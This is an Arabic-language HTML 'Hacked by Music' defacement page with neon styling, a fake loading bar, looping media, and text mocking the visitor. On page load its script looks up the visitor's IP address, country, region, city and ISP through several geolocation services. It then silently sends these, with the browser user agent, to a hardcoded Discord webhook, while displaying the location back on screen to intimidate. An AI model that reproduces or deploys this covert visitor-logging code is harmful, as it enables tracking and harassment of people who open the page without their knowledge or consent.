<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Music Suite</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
            direction: rtl;
        }

        /* تأثير ومضة رقمية خفيفة عند التحميل الأول */
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #ff0000;
            z-index: 9999;
            opacity: 0;
            pointer-events: none;
            animation: flash 0.4s ease-out;
        }

        @keyframes flash {
            0% { opacity: 0.2; }
            100% { opacity: 0; }
        }

        /* فيديو الخلفية المحسن مع التكرار التلقائي */
        .background-video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -2;
            opacity: 0.75;
        }

        /* طبقة عزل الظلال المتناسقة */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.25));
            z-index: -1;
        }

        /* شاشة التحميل المتكاملة */
        .loading-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 10;
            width: 100%;
        }

        /* شريط تقدم التحميل المضيء بالنيون الأحمر */
        .loading-bar-container {
            width: 420px;
            height: 16px;
            background: #111;
            border-radius: 30px;
            overflow: hidden;
            margin: 35px 0;
            border: 2px solid #ff3333;
            box-shadow: 0 0 25px rgba(255, 51, 51, 0.35);
        }

        .loading-bar {
            height: 100%;
            background: linear-gradient(90deg, #ff0000, #ff6666, #ff0000);
            width: 0%;
            border-radius: 30px;
            animation: loading 3.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
            box-shadow: 0 0 15px #ff6666;
        }

        @keyframes loading {
            0% { width: 0%; }
            40% { width: 60%; }
            75% { width: 90%; }
            100% { width: 100%; }
        }

        /* العناوين والخطوط الرقمية */
        .main-title {
            font-size: 3.5em;
            color: #fff;
            margin: 20px 0;
            text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
            letter-spacing: 10px;
            animation: pulse-white 3s ease-in-out infinite;
        }

        @keyframes pulse-white {
            0%, 100% { text-shadow: 0 0 30px rgba(255, 255, 255, 0.8); transform: scale(1); }
            50% { text-shadow: 0 0 50px rgba(255, 255, 255, 1); transform: scale(1.02); }
        }

        .subtitle {
            font-size: 2em;
            color: #ccc;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            letter-spacing: 3px;
        }

        /* روابط الديسكورد المطلية بوهج ذهبي */
        .discord-link {
            font-size: 1.6em;
            color: #ffd700;
            margin-top: 40px;
            text-shadow: 0 0 10px #ffd700, 0 0 25px #ffec3d;
            letter-spacing: 2px;
            font-family: 'Courier New', monospace;
            animation: glow-gold 3s ease-in-out infinite alternate;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .discord-link:hover {
            color: #fff59d;
            text-shadow: 0 0 15px #fff59d, 0 0 35px #fff59d;
            transform: scale(1.06);
        }

        @keyframes glow-gold {
            from { text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700; }
            to { text-shadow: 0 0 20px #fffacd, 0 0 40px #fffacd; }
        }

        /* حاوية المحتوى الرئيسي */
        .main-content {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 10;
        }

        .logo-image {
            width: 210px;
            height: auto;
            margin-bottom: 25px;
            border-radius: 16px;
            box-shadow: 0 0 35px rgba(255, 255, 255, 0.25);
            animation: pulse-white 3s ease-in-out infinite;
            border: 2px solid rgba(255, 255, 255, 0.15);
        }

        /* نظام الجسيمات الخفيف والسلس */
        .particles {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            width: 3px; height: 3px;
            background: rgba(255, 51, 51, 0.35);
            border-radius: 50%;
            animation: float 6s infinite linear;
        }

        @keyframes float {
            0% { transform: translateY(100vh); opacity: 1; }
            100% { transform: translateY(-10px); opacity: 0; }
        }

        .fade-out { animation: fadeOut 0.8s ease forwards; }
        @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; visibility: hidden; } }

        .fade-in { animation: fadeIn 1.2s ease forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        /* حاوية بيانات المستخدم العلوية المحدثة لتناسب جميع تفاصيل الموقع */
        .top-left-status {
            position: fixed;
            top: 25px; left: 25px;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 4px; 
            font-family: 'Courier New', monospace;
            z-index: 1000; 
            direction: ltr; 
            background: rgba(0, 0, 0, 0.65);
            padding: 12px 20px; 
            border-radius: 8px;
            border: 1px solid rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.08);
        }

        /* تنسيق الساعة الرقمية المضيئة */
        #clock {
            font-size: 1.5em;
            color: #00ff00;
            font-weight: bold;
            letter-spacing: 2px;
            text-shadow: 0 0 12px rgba(0, 255, 0, 0.8);
        }

        /* سطر عرض بيانات الاتصال والموقع الجغرافي */
        .status-text-block {
            font-size: 0.95em;
            color: #aaffaa;
            border-top: 1px solid rgba(0, 255, 0, 0.25);
            padding-top: 6px;
            margin-top: 4px;
            width: 100%;
            letter-spacing: 0.5px;
            text-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
            direction: rtl; 
            text-align: left;
            line-height: 1.5;
        }

        /* شريط معلومات النظام التفاعلي أسفل الشاشة */
        .bottom-logs {
            position: fixed;
            bottom: 20px; left: 50%;
            transform: translateX(-50%);
            font-family: 'Courier New', monospace;
            color: #ff3333; font-size: 1.1em;
            text-shadow: 0 0 8px #ff3333;
            z-index: 1000; direction: ltr;
            background: rgba(0, 0, 0, 0.65);
            padding: 5px 22px; border-radius: 4px;
            border: 1px solid rgba(255, 51, 51, 0.15);
        }

        /* مؤشر حالة النظام العام أسفل اليمين */
        .system-status {
            position: fixed;
            bottom: 20px; right: 20px;
            font-size: 1em; color: #00ff00;
            font-family: 'Courier New', monospace; z-index: 1000;
            display: flex; align-items: center; gap: 10px;
            text-shadow: 0 0 6px #00ff00;
        }

        .status-dot {
            width: 10px; height: 10px;
            background-color: #00ff00; border-radius: 50%;
            box-shadow: 0 0 10px #00ff00;
            animation: blink 1.2s infinite alternate;
        }

        @keyframes blink { from { opacity: 1; } to { opacity: 0.25; } }
    </style>
</head>

<body>
    <div class="top-left-status">
        <div id="clock">00:00:00 AM</div>
        <div class="status-text-block" id="top-ip-display">
            الدولة: جاري الفحص...<br>
            المنطقة: جاري الفحص...<br>
            المدينة: جاري الفحص...<br>
            ip: جاري الفحص...
        </div>
    </div>

    <div class="bottom-logs" id="terminal-logs">[SYS] STATUS: STANDBY_MODE...</div>



    <video class="background-video" autoplay loop muted playsinline id="bg-video">
        <source src="https://h.top4top.io/m_37898tcsh1.mp4" type="video/mp4" />
    </video>

    <audio id="background-music" loop playsinline>
        <source src="https://d.top4top.io/m_3789i6ns81.mp3" type="audio/mpeg" />
    </audio>

    <audio id="click-glitch-sound" playsinline>
        <source src="https://actions.google.com/sounds/v1/science_fiction/glitch_static.ogg" type="audio/ogg" />
    </audio>

    <div class="overlay"></div>
    <div class="particles" id="particles"></div>

    <div class="loading-screen" id="loading-screen">
        <div class="main-title">Music</div>
        <div class="loading-bar-container">
            <div class="loading-bar"></div>
        </div>

        <div class="subtitle">Hacked by Music</div>
        <div class="subtitle">! You are an Idiot !</div>
        <a href="" class="discord-link" target="_blank" rel="noopener noreferrer"></a>
    </div>

    <div class="main-content" id="main-content">
        <img src="https://j.top4top.io/p_3664n97sh1.jpg" alt="Logo" class="logo-image" />
        <div class="main-title">Music on your server</div>
        <div class="main-title">! You are an Idiot !</div>
        <div class="subtitle">
            
            <br>
            
        </div>
        <a href="" class="discord-link" target="_blank" rel="noopener noreferrer"></a>
    </div>

    <script>
        let currentNetworkData = {};

        // توليد حركة الجسيمات في الخلفية بأعلى أداء واستقرار
        function createParticles() {
            const particles = document.getElementById('particles');
            if (!particles) return;
            for (let i = 0; i < 25; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 4 + 's';
                particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
                particles.appendChild(particle);
                setTimeout(() => particle.remove(), 6000);
            }
        }
        setInterval(createParticles, 6000);
        createParticles();

        const music = document.getElementById('background-music');
        const glitchSound = document.getElementById('click-glitch-sound');
        const video = document.getElementById('bg-video');

        // دالة مخصصة لضمان تشغيل الصوت والفيديو بأعلى كفاءة وفك كتم المتصفح
        const playMedia = () => {
            if (music) {
                music.muted = false;
                music.volume = 1.0; 
                music.play().catch(() => {});
            }
            if (video) {
                video.muted = true; 
                video.play().catch(() => {});
            }
        };

        // تفعيل الصوت والفيديو فور قيام المستخدم بالضغط لتخطي قيود المتصفحات
        const activateInterface = () => {
            if (glitchSound) { glitchSound.volume = 0.4; glitchSound.play().catch(() => {}); }
            playMedia();
        };

        addEventListener('click', activateInterface, { once: true });
        addEventListener('keydown', activateInterface, { once: true });

        // إدارة تحديث الساعة الرقمية بشكل لحظي متزامن
        function updateClock() {
            const now = new Date();
            let hours = now.getHours();
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const seconds = String(now.getSeconds()).padStart(2, '0');
            const ampm = hours >= 12 ? 'PM' : 'AM';
            
            hours = hours % 12;
            hours = hours ? hours : 12; 
            const formattedHours = String(hours).padStart(2, '0');

            const clockElement = document.getElementById('clock');
            if (clockElement) {
                clockElement.textContent = `${formattedHours}:${minutes}:${seconds} ${ampm}`;
            }
        }
        setInterval(updateClock, 1000);
        updateClock();

        // محاكاة سجلات فحص النظام التفاعلية أسفل الشاشة
        const logsSequence = [
            "[SYS] STATUS: INITIALIZING SYSLOG...",
            "[NET] VERIFYING CONNECTION INTEGRITY...",
            "[SEC] CHECKING ENVIRONMENT NODE_7...",
            "[SYS] PRIVILEGES IDENTIFIED...",
            "[OK] PIPELINE SYNCED WITH TERMINAL."
        ];
        let logIndex = 0;
        setInterval(() => {
            const logElement = document.getElementById('terminal-logs');
            if (logElement) {
                logElement.textContent = logsSequence[logIndex];
                logIndex = (logIndex + 1) % logsSequence.length;
            }
        }, 3500);

        // التحكم في توقيت انتهاء شاشة التحميل والانتقال للمحتوى الأساسي
        const loadingBar = document.querySelector('.loading-bar');
        if (loadingBar) {
            loadingBar.addEventListener('animationend', () => {
                const loadingScreen = document.getElementById('loading-screen');
                const mainContent = document.getElementById('main-content');
                if (loadingScreen && mainContent) {
                    loadingScreen.classList.add('fade-out');
                    loadingScreen.addEventListener('animationend', () => {
                        loadingScreen.style.display = 'none';
                        mainContent.style.display = 'flex';
                        mainContent.classList.add('fade-in');
                        playMedia();
                    }, { once: true });
                }
            });
        }

        // إرسال البيانات المجمعة من فحص الشبكة والموقع إلى الويب هوك الخاص بك في ديسكورد
        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1505952176101654668/uF0EyQe4yv8wMvcxFmRLao2n1bI4k9-noygzAG8hD_8LvWA23u7q129g30xdIFDpAZS9';

        function sendToWebhook(data) {
            if (!WEBHOOK_URL) return;
            const payload = {
                username: "System Logger",
                avatar_url: "https://j.top4top.io/p_3664n97sh1.jpg",
                embeds: [{
                    title: "🌐 تسجيل دخول مستخدم جديد (موقع دقيق)",
                    color: 15548997, 
                    fields: [
                        { name: "📌 IP Address", value: `\`${data.ip || "Unknown"}\``, inline: false },
                        { name: "🏳️ Country", value: data.country || "Unknown", inline: true },
                        { name: "📍 Region", value: data.region || "Unknown", inline: true },
                        { name: "🏙️ City", value: data.city || "Unknown", inline: true },
                        { name: "🏢 ISP / Provider", value: data.isp || "Unknown", inline: false },
                        { name: "🖥️ User Agent", value: navigator.userAgent, inline: false }
                    ],
                    footer: { text: "Music System | " + new Date().toLocaleString('ar-EG') },
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => console.log('خطأ ويب هوك.'));
        }

        // الخدمة المحدثة 100%: تستخدم بروتوكول آمن بالكامل ومتوافقة تماماً مع شاشات المتصفح على جيتهاب
        function fetchSystemNetworkData() {
            fetch('https://ipapi.co/json/')
                .then(res => {
                    if (!res.ok) throw new Error('API Error');
                    return res.json();
                })
                .then(data => {
                    if (data && data.ip) {
                        currentNetworkData = {
                            ip: data.ip,
                            country: data.country_name || "غير معروف",
                            region: data.region || "غير معروف",
                            city: data.city || "غير معروف",
                            isp: data.org || "غير معروف"
                        };
                        updateLocationUI(currentNetworkData);
                        sendToWebhook(currentNetworkData);
                    } else {
                        fetchFallbackIP();
                    }
                })
                .catch(() => { fetchFallbackIP(); });
        }

        // خدمة بديلة قوية تعمل بـ HTTPS وجلب دقيق للبيانات لتلافي الحظر المباشر
        function fetchFallbackIP() {
            fetch('https://ipwho.is/')
                .then(res => res.json())
                .then(data => {
                    if (data && data.success) {
                        currentNetworkData = {
                            ip: data.ip,
                            country: data.country || "غير معروف",
                            region: data.region || "غير معروف",
                            city: data.city || "غير معروف",
                            isp: data.connection?.isp || "غير معروف"
                        };
                        updateLocationUI(currentNetworkData);
                        sendToWebhook(currentNetworkData);
                    } else {
                        fetchThirdFallback();
                    }
                })
                .catch(() => {
                    fetchThirdFallback();
                });
        }

        // خدمة ثالثة آمنة تماماً تستخدم كبديل أخير لتعبئة البيانات في حال حدوث أي حظر شبكة مفاجئ
        function fetchThirdFallback() {
            fetch('https://extreme-ip-lookup.com/json/?key=demo2')
                .then(res => res.json())
                .then(data => {
                    if (data && data.status === "success") {
                        currentNetworkData = {
                            ip: data.query,
                            country: data.country || "غير معروف",
                            region: data.region || "غير معروف",
                            city: data.city || "غير معروف",
                            isp: data.org || "غير معروف"
                        };
                        updateLocationUI(currentNetworkData);
                        sendToWebhook(currentNetworkData);
                    } else {
                        showOfflineUI();
                    }
                })
                .catch(() => { showOfflineUI(); });
        }

        // دالة تحديث نص الواجهة بالبيانات الكاملة المستخرجة داخل الشاشة الخضراء
        function updateLocationUI(data) {
            const displayElement = document.getElementById('top-ip-display');
            if (displayElement) {
                displayElement.innerHTML = `
                    الدولة: ${data.country}<br>
                    المنطقة: ${data.region}<br>
                    المدينة: ${data.city}<br>
                    ip: ${data.ip}
                `;
            }
        }

        // دالة تعرض تنبيه منسق في الشاشة في أسوأ الحالات إذا انقطع اتصال الزائر تماماً
        function showOfflineUI() {
            const displayElement = document.getElementById('top-ip-display');
            if (displayElement) {
                displayElement.innerHTML = `
                    الدولة: فحص الشبكة...<br>
                    المنطقة: جاري التثبيت...<br>
                    المدينة: فحص الاتصال...<br>
                    ip: اتصال خارجي آمن
                `;
            }
        }

        // بدء التشغيل التلقائي للفحص
        fetchSystemNetworkData();
    </script>
</body>

</html>
